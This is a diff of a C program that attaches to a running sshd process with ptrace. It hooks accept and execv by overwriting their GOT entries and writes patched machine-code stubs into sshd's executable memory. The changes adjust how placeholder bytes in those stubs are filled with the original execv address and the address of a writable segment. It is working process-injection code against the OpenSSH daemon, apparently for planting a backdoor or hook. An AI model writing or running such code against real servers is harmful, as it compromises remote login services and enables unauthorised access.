@@ -26,22 +26,31 @@
 #define SSHD_PATH "/usr/sbin/sshd"
 #define SESSION_PATH "/usr/lib/ssh/sshd-session"
 
+#define MOV_RAX_CALL "\x48\xB8\xCD\xAB\x89\x67\x45\x23\x00\x00\xFF\xD0"
+#define MOV_RAX "\x48\xB8\xBC\x9A\x78\x56\x34\x12\x00\x00"
+
+// replace the place_holder to the bytes I need
 void
-preprocess_code (uint64_t sshd_base)
+preprocess_code (uint32_t pid, uint64_t sshd_base)
 {
-  uint8_t sshd_rw_start[8];
-  *((uint64_t *)sshd_rw_start)
-      = sshd_base + get_seg_gap (SSHD_PATH, 6);
+  char *mov_rax_call = MOV_RAX_CALL;
 
-  uint8_t *mov_r9_text = assemble ("mov r9, 0x123456789abc");
+  uint64_t execv_got = sshd_base + get_got_offset (SSHD_PATH, "execv");
+  uint64_t execv;
+  copy_from_tracee (pid, execv_got, (char *)&execv, 8);
 
-  char *mov_r9 = memmem ((char *)sshd_accept, sizeof (sshd_accept), (char *)mov_r9_text, 0xa);
-  memcpy (&mov_r9[2], sshd_rw_start, 0x8);
-  mov_r9 = memmem ((char *)sshd_execv, sizeof (sshd_execv), (char *)mov_r9_text, 0xa);
-  memcpy (&mov_r9[2], sshd_rw_start, 0x8);
-  // replace the placeholder with sshd_rw_start
+  mov_rax_call = memmem (sshd_execv, sizeof (sshd_execv), mov_rax_call, 0xc);
+  memcpy (&mov_rax_call[2], &execv, 8);
 
-  ks_free (mov_r9_text);
+  char *mov_rax = MOV_RAX;
+  uint64_t sshd_rw_start = sshd_base + get_seg_gap (SSHD_PATH, 6);
+
+  mov_rax = memmem (sshd_accept, sizeof (sshd_accept), mov_rax, 0xa);
+  memcpy (&mov_rax[2], &sshd_rw_start, 0x8);
+
+  mov_rax = MOV_RAX;
+  mov_rax = memmem (sshd_execv, sizeof (sshd_execv), mov_rax, 0xa);
+  memcpy (&mov_rax[2], &sshd_rw_start, 0x8);
 }
 
 int
@@ -54,14 +63,16 @@ main (int argc, char **argv)
   attach (pid);
   // ptrace (PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
   uint64_t sshd_base = parse_maps (pid, "r--p");
-  preprocess_code (sshd_base);
+  preprocess_code (pid, sshd_base);
 
   uint64_t accept_got = sshd_base + get_got_offset (SSHD_PATH, "accept");
   uint64_t execv_got = sshd_base + get_got_offset (SSHD_PATH, "execv");
 
   uint64_t sshd_rx_start = sshd_base + get_seg_gap (SSHD_PATH, 5);
   uint64_t sshd_rx_gap = sshd_rx_start % 0x1000;
-  printf ("sshd_rx_gap: %lx", (0x1000 - sshd_rx_gap));
+  printf ("sshd_rx_gap: 0x%lx\n", (0x1000 - sshd_rx_gap));
+  printf ("while we need 0x%lx\n",
+          (sizeof (sshd_accept) + sizeof (sshd_execv)));
 
   copy_to_tracee (pid, sshd_rx_start, sshd_accept, sizeof (sshd_accept));
   copy_to_tracee (pid, accept_got, (uint8_t *)&sshd_rx_start, 0x8);
